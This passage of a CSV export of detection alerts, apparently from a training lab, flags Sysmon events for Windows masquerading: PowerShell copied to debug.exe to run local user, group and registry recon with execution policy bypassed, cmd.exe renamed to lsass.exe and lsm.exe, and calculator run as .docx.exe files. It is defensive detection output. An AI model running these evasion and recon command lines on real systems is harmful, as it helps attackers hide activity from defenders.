MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.624","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.905 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172646,"Cmdline: ""C:\Windows\Temp\debug.exe"" Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5248 ¦ PGUID: E9F06A57-9429-694A-B702-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.904","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.758 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172674,"Cmdline: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.docx.exe ¦ Proc: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.docx.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2252 ¦ PGUID: E9F06A57-9545-694A-C502-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows Calculator ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CFCA921BBAC5103BF369B2B1B604C13E,SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A,IMPHASH=1C9F3A396211B31FA9D65A8CE96B9BB4","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: CALC.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:37.756","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:38.833 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172676,"Cmdline: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.exe ¦ Proc: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 9036 ¦ PGUID: E9F06A57-9546-694A-C702-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows Calculator ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CFCA921BBAC5103BF369B2B1B604C13E,SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A,IMPHASH=1C9F3A396211B31FA9D65A8CE96B9BB4","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: CALC.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:38.821","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:40.164 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172678,"Cmdline: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.ps1.exe ¦ Proc: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.ps1.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8988 ¦ PGUID: E9F06A57-9548-694A-CA02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows Calculator ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=CFCA921BBAC5103BF369B2B1B604C13E,SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A,IMPHASH=1C9F3A396211B31FA9D65A8CE96B9BB4","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1882 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: CALC.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:40.117","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:22.002 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172706,"Cmdline: C:\lsm.exe /c echo T1036.003 ¦ Proc: C:\lsm.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6408 ¦ PGUID: E9F06A57-9625-694A-E002-000000002300 ¦ ParentPID: 1012 ¦ ParentPGUID: E9F06A57-9625-694A-DF02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:16:21.998","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.060 +01:00","Renamed Exe File","low","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172711,"Cmdline: C:\WINDOWS\Temp\lsass.exe /B ¦ Proc: C:\Windows\Temp\lsass.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe && %SystemRoot%\Temp\lsass.exe /B ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8880 ¦ PGUID: E9F06A57-96A1-694A-E502-000000002300 ¦ ParentPID: 3648 ¦ ParentPGUID: E9F06A57-96A0-694A-E402-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:18:25.056","Sysmon_1_Low_ExeFileRenamed.yml","cc1b2ee2-e737-47ac-8ef1-d6065b65292b","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.796 +01:00","LOLBAS Renamed","high","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172640,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-process ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8840 ¦ PGUID: E9F06A57-9428-694A-B402-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.792","Sysmon_1_ProcExec_High_LOLBAS-Rename.yml","dc5700ef-3688-44c9-b719-8e1a632ff3dd","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.276 +01:00","LOLBAS Renamed","high","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172642,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localgroup ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8540 ¦ PGUID: E9F06A57-9429-694A-B502-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.275","Sysmon_1_ProcExec_High_LOLBAS-Rename.yml","dc5700ef-3688-44c9-b719-8e1a632ff3dd","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.625 +01:00","LOLBAS Renamed","high","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172644,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localuser ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5320 ¦ PGUID: E9F06A57-9429-694A-B602-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.624","Sysmon_1_ProcExec_High_LOLBAS-Rename.yml","dc5700ef-3688-44c9-b719-8e1a632ff3dd","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.905 +01:00","LOLBAS Renamed","high","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172646,"Cmdline: ""C:\Windows\Temp\debug.exe"" Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5248 ¦ PGUID: E9F06A57-9429-694A-B702-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.904","Sysmon_1_ProcExec_High_LOLBAS-Rename.yml","dc5700ef-3688-44c9-b719-8e1a632ff3dd","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:22.002 +01:00","LOLBAS Renamed","high","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172706,"Cmdline: C:\lsm.exe /c echo T1036.003 ¦ Proc: C:\lsm.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy C:\Windows\System32\cmd.exe C:\lsm.exe && C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6408 ¦ PGUID: E9F06A57-9625-694A-E002-000000002300 ¦ ParentPID: 1012 ¦ ParentPGUID: E9F06A57-9625-694A-DF02-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:16:21.998","Sysmon_1_ProcExec_High_LOLBAS-Rename.yml","dc5700ef-3688-44c9-b719-8e1a632ff3dd","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.060 +01:00","LOLBAS Renamed","high","DESKTOP-G2OBL3D","Sysmon",1,"","","lolbas ¦ sysmon",172711,"Cmdline: C:\WINDOWS\Temp\lsass.exe /B ¦ Proc: C:\Windows\Temp\lsass.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe && %SystemRoot%\Temp\lsass.exe /B ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8880 ¦ PGUID: E9F06A57-96A1-694A-E502-000000002300 ¦ ParentPID: 3648 ¦ ParentPGUID: E9F06A57-96A0-694A-E402-000000002300 ¦ Description: Windows Command Processor ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=FE48494F2B5A9C452F12E9BBE93A6BE6,SHA256=746C77047FC973F7CA66F8AF28274A30E05F4BB1751EE8A2C6546D9DA48E1115,IMPHASH=EDEF5A2A98D730D4288FE684BA0B0E00","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.2454 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: Cmd.Exe ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:18:25.056","Sysmon_1_ProcExec_High_LOLBAS-Rename.yml","dc5700ef-3688-44c9-b719-8e1a632ff3dd","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:38.814 +01:00","Proc Terminated","info","DESKTOP-G2OBL3D","Sysmon",5,"","","sysmon",172675,"Proc: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.docx.exe ¦ PID: 2252 ¦ PGUID: E9F06A57-9545-694A-C502-000000002300","RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:38.813","Sysmon_5_Info_ProcTerm.yml","02353fdd-522c-48f8-9243-28d4830ebc1e","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:40.112 +01:00","Proc Terminated","info","DESKTOP-G2OBL3D","Sysmon",5,"","","sysmon",172677,"Proc: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.exe ¦ PID: 9036 ¦ PGUID: E9F06A57-9546-694A-C702-000000002300","RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:40.112","Sysmon_5_Info_ProcTerm.yml","02353fdd-522c-48f8-9243-28d4830ebc1e","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.323 +01:00","Proc Terminated","info","DESKTOP-G2OBL3D","Sysmon",5,"","","sysmon",172679,"Proc: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.ps1.exe ¦ PID: 8988 ¦ PGUID: E9F06A57-9548-694A-CA02-000000002300","RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:41.321","Sysmon_5_Info_ProcTerm.yml","02353fdd-522c-48f8-9243-28d4830ebc1e","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:21.983 +01:00","Files With System Process Name In Unsuspected Locations","med","DESKTOP-G2OBL3D","Sysmon",11,"Evas","T1036.005","sysmon",172705,"Path: C:\lsm.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 1012 ¦ PGUID: E9F06A57-9625-694A-DF02-000000002300","CreationUtcTime: 2025-12-23 13:16:21.982 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:16:21.982","file_event_win_creation_system_file.yml","eccfe194-f618-b054-3986-7f7529f079f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.045 +01:00","Files With System Process Name In Unsuspected Locations","med","DESKTOP-G2OBL3D","Sysmon",11,"Evas","T1036.005","sysmon",172710,"Path: C:\Windows\Temp\lsass.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 3648 ¦ PGUID: E9F06A57-96A0-694A-E402-000000002300","CreationUtcTime: 2025-12-23 13:18:25.043 ¦ RuleName: EXE ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:18:25.043","file_event_win_creation_system_file.yml","eccfe194-f618-b054-3986-7f7529f079f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.873 +01:00","PSScriptPolicyTest Creation By Uncommon Process","med","DESKTOP-G2OBL3D","Sysmon",11,"Evas","","sysmon",172641,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_wo1rsl4t.2fj.ps1 ¦ Proc: C:\Windows\Temp\debug.exe ¦ PID: 8840 ¦ PGUID: E9F06A57-9428-694A-B402-000000002300","CreationUtcTime: 2025-12-23 13:07:52.864 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:52.864","file_event_win_ps_script_policy_test_creation_by_uncommon_process.yml","0727210f-3e70-0a60-0d85-98c55ecf7daf","C:\Tools\Logs\mc_defense.evtx"
